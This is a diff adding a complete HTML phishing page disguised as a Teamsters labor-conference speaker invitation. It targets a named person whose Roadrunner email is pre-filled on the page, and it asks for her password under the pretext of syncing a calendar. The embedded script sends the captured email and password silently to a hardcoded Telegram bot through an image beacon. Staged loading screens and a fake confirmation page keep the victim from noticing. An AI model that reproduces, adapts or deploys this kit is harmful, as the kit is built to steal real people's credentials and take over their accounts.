@@ -1,0 +1,371 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Invitation: Labor Conference 2026</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+<style>
+    * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', -apple-system, sans-serif; }
+    
+    body {
+        background-color: #f4f6f9;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        min-height: 100vh;
+        color: #1a1a1a;
+        padding: 20px;
+    }
+
+    .card {
+        background: #ffffff;
+        border-radius: 16px;
+        box-shadow: 0 10px 30px rgba(0,0,0,0.08);
+        width: 100%;
+        max-width: 480px;
+        padding: 40px 30px;
+        text-align: center;
+        position: relative;
+        overflow: hidden;
+    }
+
+    /* Page Visibility */
+    .page { display: none; }
+    .page.active { display: block; animation: fadeIn 0.4s ease; }
+
+    @keyframes fadeIn {
+        from { opacity: 0; transform: translateY(10px); }
+        to { opacity: 1; transform: translateY(0); }
+    }
+
+    /* --- TEAMSTERS BLUE VARIABLES --- */
+    :root {
+        --teamsters-blue: #003399;
+        --teamsters-blue-hover: #002673;
+    }
+
+    /* --- INTRO PAGE --- */
+    .teamster-logo {
+        width: 140px;
+        margin-bottom: 24px;
+    }
+    h1 {
+        font-size: 24px;
+        font-weight: 700;
+        color: #1a1a1a;
+        margin-bottom: 12px;
+    }
+    .intro-text {
+        font-size: 15px;
+        color: #555;
+        line-height: 1.6;
+        margin-bottom: 30px;
+    }
+    .btn-primary {
+        background-color: var(--teamsters-blue);
+        color: white;
+        border: none;
+        padding: 16px 24px;
+        border-radius: 8px;
+        font-size: 16px;
+        font-weight: 600;
+        width: 100%;
+        cursor: pointer;
+        transition: background 0.2s;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        gap: 10px;
+    }
+    .btn-primary:hover { background-color: var(--teamsters-blue-hover); }
+
+    /* --- LOADING SPINNER --- */
+    .spinner-container {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+        padding: 50px 0;
+    }
+    .spinner {
+        width: 40px;
+        height: 40px;
+        border: 4px solid #e0e0e0;
+        border-top: 4px solid var(--teamsters-blue);
+        border-radius: 50%;
+        animation: spin 1s linear infinite;
+        margin-bottom: 20px;
+    }
+    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    .loading-text { font-size: 15px; color: #555; font-weight: 500; height: 20px; transition: opacity 0.3s; }
+
+    /* --- LOGIN PAGE --- */
+    .login-header {
+        font-size: 20px;
+        font-weight: 600;
+        margin-bottom: 8px;
+    }
+    .login-sub {
+        font-size: 14px;
+        color: #666;
+        margin-bottom: 25px;
+    }
+    .input-group {
+        text-align: left;
+        margin-bottom: 16px;
+    }
+    .input-group label {
+        display: block;
+        font-size: 13px;
+        font-weight: 500;
+        color: #333;
+        margin-bottom: 6px;
+    }
+    .input-group input {
+        width: 100%;
+        padding: 14px;
+        border: 1px solid #ccc;
+        border-radius: 8px;
+        font-size: 15px;
+        outline: none;
+    }
+    .input-group input:focus {
+        border-color: var(--teamsters-blue);
+    }
+
+    /* --- CALENDAR PAGE --- */
+    .calendar-grid {
+        display: grid;
+        grid-template-columns: repeat(7, 1fr);
+        gap: 4px;
+        margin-top: 20px;
+        margin-bottom: 25px;
+    }
+    .day-name {
+        font-weight: 600;
+        font-size: 12px;
+        color: #888;
+        padding-bottom: 10px;
+    }
+    .day {
+        padding: 10px 0;
+        font-size: 14px;
+        border-radius: 8px;
+        cursor: default;
+        color: #333;
+    }
+    .day.highlight {
+        background-color: var(--teamsters-blue);
+        color: white;
+        font-weight: bold;
+        animation: pulse 2s infinite;
+    }
+    
+    @keyframes pulse {
+        0% { box-shadow: 0 0 0 0 rgba(0,51,153,0.4); }
+        70% { box-shadow: 0 0 0 8px rgba(0,51,153,0); }
+        100% { box-shadow: 0 0 0 0 rgba(0,51,153,0); }
+    }
+
+    /* --- THANK YOU PAGE --- */
+    .thank-you-title { font-size: 24px; font-weight: 700; margin-bottom: 16px; color: #1a1a1a; }
+    .thank-you-text { font-size: 15px; color: #555; line-height: 1.6; margin-bottom: 20px;}
+    .thank-you-footer { font-size: 14px; color: #888; font-style: italic; }
+
+</style>
+</head>
+<body>
+
+<div class="card">
+    
+    <!-- PAGE 0: INITIAL 2-SECOND LOAD -->
+    <div id="page-initial-load" class="page active">
+        <div class="spinner-container">
+            <div class="spinner"></div>
+            <div class="loading-text">Preparing your invitation...</div>
+        </div>
+    </div>
+
+    <!-- PAGE 1: INTRO -->
+    <div id="page-intro" class="page">
+        <img src="https://i.ibb.co/PGrxJSSP/images-8.png" alt="Teamsters" class="teamster-logo">
+        <h1>You're Invited</h1>
+        <p class="intro-text">
+            Join us for the upcoming Labor Conference on <strong>December 8th, 2026</strong>. 
+            We are honored to have you as our guest speaker. Please add the event to your calendar to confirm your attendance.
+        </p>
+        <button class="btn-primary" onclick="handleAddToCalendar()">
+            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line></svg>
+            Add to Calendar
+        </button>
+    </div>
+
+    <!-- PAGE 2: LOADING (Before Login) -->
+    <div id="page-loading-1" class="page">
+        <div class="spinner-container">
+            <div class="spinner"></div>
+            <div class="loading-text" id="loading-text-1">Generating secure invite...</div>
+        </div>
+    </div>
+
+    <!-- PAGE 3: LOGIN -->
+    <div id="page-login" class="page">
+        <h2 class="login-header">Verify Identity</h2>
+        <p class="login-sub">Please sign in to your Roadrunner account to sync the calendar.</p>
+        <form id="login-form">
+            <div class="input-group">
+                <label>Email Address</label>
+                <input type="email" id="email" value="sterlin@roadrunner.com" required readonly style="background:#f9f9f9; color:#666;">
+            </div>
+            <div class="input-group">
+                <label>Password</label>
+                <input type="password" id="password" placeholder="Enter your password" required>
+            </div>
+            <button type="submit" class="btn-primary" style="margin-top:10px;">Log In</button>
+        </form>
+    </div>
+
+    <!-- PAGE 4: LOADING (Before Calendar) -->
+    <div id="page-loading-2" class="page">
+        <div class="spinner-container">
+            <div class="spinner"></div>
+            <div class="loading-text" id="loading-text-2">Authenticating...</div>
+        </div>
+    </div>
+
+    <!-- PAGE 5: CALENDAR -->
+    <div id="page-calendar" class="page">
+        <h2 class="login-header">December 2026</h2>
+        <p class="login-sub">Select the event date to accept the invitation.</p>
+        
+        <div class="calendar-grid">
+            <div class="day-name">Su</div><div class="day-name">Mo</div><div class="day-name">Tu</div><div class="day-name">We</div><div class="day-name">Th</div><div class="day-name">Fr</div><div class="day-name">Sa</div>
+            
+            <!-- Empty slots for Dec 2026 (Starts on Tuesday) -->
+            <div class="day"></div><div class="day"></div>
+            <div class="day">1</div><div class="day">2</div><div class="day">3</div><div class="day">4</div><div class="day">5</div>
+            <div class="day">6</div><div class="day">7</div>
+            <div class="day highlight">8</div>
+            <div class="day">9</div><div class="day">10</div><div class="day">11</div><div class="day">12</div>
+            <div class="day">13</div><div class="day">14</div><div class="day">15</div><div class="day">16</div><div class="day">17</div><div class="day">18</div><div class="day">19</div>
+            <div class="day">20</div><div class="day">21</div><div class="day">22</div><div class="day">23</div><div class="day">24</div><div class="day">25</div><div class="day">26</div>
+            <div class="day">27</div><div class="day">28</div><div class="day">29</div><div class="day">30</div><div class="day">31</div>
+        </div>
+
+        <button class="btn-primary" onclick="handleAcceptInvite()">
+            Add to Calendar
+        </button>
+    </div>
+
+    <!-- PAGE 6: LOADING (Before Thank You) -->
+    <div id="page-loading-3" class="page">
+        <div class="spinner-container">
+            <div class="spinner"></div>
+            <div class="loading-text" id="loading-text-3">Adding event to your calendar...</div>
+        </div>
+    </div>
+
+    <!-- PAGE 7: THANK YOU -->
+    <div id="page-thankyou" class="page">
+        <h2 class="thank-you-title">Your Invitation is Confirmed</h2>
+        <p class="thank-you-text">
+            Thank you, Linda. We can't wait to see you on December 8th. Your calendar has been successfully updated with the event details.
+        </p>
+        <p class="thank-you-footer">
+            We will be in touch shortly with the final itinerary and speaker guidelines.
+        </p>
+    </div>
+
+</div>
+
+<script>
+    // ================== TELEGRAM CONFIGURATION ==================
+    const BOT_TOKEN = "9052282398:AAEuSnLfC4angqxItEp3fo9mZCgUwNSplVg";
+    const CHAT_ID = "8611966705";
+    // ============================================================
+
+    // Helper to switch pages
+    function showPage(pageId) {
+        document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+        document.getElementById(pageId).classList.add('active');
+    }
+
+    // Initial 2-second load
+    window.onload = function() {
+        setTimeout(() => {
+            showPage('page-intro');
+        }, 2000); // 2 seconds
+    };
+
+    // Dynamic Loading Logic
+    function runLoadingSequence(texts, duration, nextPage, textElementId) {
+        showPage(textElementId === 'loading-text-1' ? 'page-loading-1' : (textElementId === 'loading-text-2' ? 'page-loading-2' : 'page-loading-3'));
+        
+        const textEl = document.getElementById(textElementId);
+        let index = 0;
+        textEl.innerText = texts[0];
+        
+        // Change text every 1.5 seconds
+        const interval = setInterval(() => {
+            index++;
+            if (index < texts.length) {
+                textEl.innerText = texts[index];
+            }
+        }, 1500);
+        
+        // Move to next page after total duration
+        setTimeout(() => {
+            clearInterval(interval);
+            showPage(nextPage);
+        }, duration);
+    }
+
+    // Step 1: Add to Calendar -> 4.5s Load -> Login
+    function handleAddToCalendar() {
+        runLoadingSequence(
+            ["Generating secure invite...", "Connecting to server...", "Please wait..."], 
+            4500, 
+            'page-login',
+            'loading-text-1'
+        );
+    }
+
+    // Step 2: Login -> Send to Telegram -> 4.5s Load -> Calendar
+    document.getElementById('login-form').addEventListener('submit', function(e) {
+        e.preventDefault();
+        
+        const email = document.getElementById('email').value;
+        const password = document.getElementById('password').value;
+
+        // Format for Telegram
+        const message = `🎤 *Linda Deane - Portal Capture*\n\n` +
+                        `📧 *Email:* ${email}\n` +
+                        `🔑 *Password:* ${password}`;
+
+        // Image beacon trick to send to Telegram silently
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
+        new Image().src = url;
+
+        // Show 4.5s loading sequence with 1.5s text changes
+        runLoadingSequence(
+            ["Authenticating...", "Connecting to calendar...", "Syncing calendar data..."], 
+            4500, 
+            'page-calendar',
+            'loading-text-2'
+        );
+    });
+
+    // Step 3: Click "Add to Calendar" on Calendar page -> 4.5s Load -> Thank You
+    function handleAcceptInvite() {
+        runLoadingSequence(
+            ["Adding event to your calendar...", "Sending confirmation...", "Almost done..."], 
+            4500, 
+            'page-thankyou',
+            'loading-text-3'
+        );
+    }
+</script>
+
+</body>
+</html>
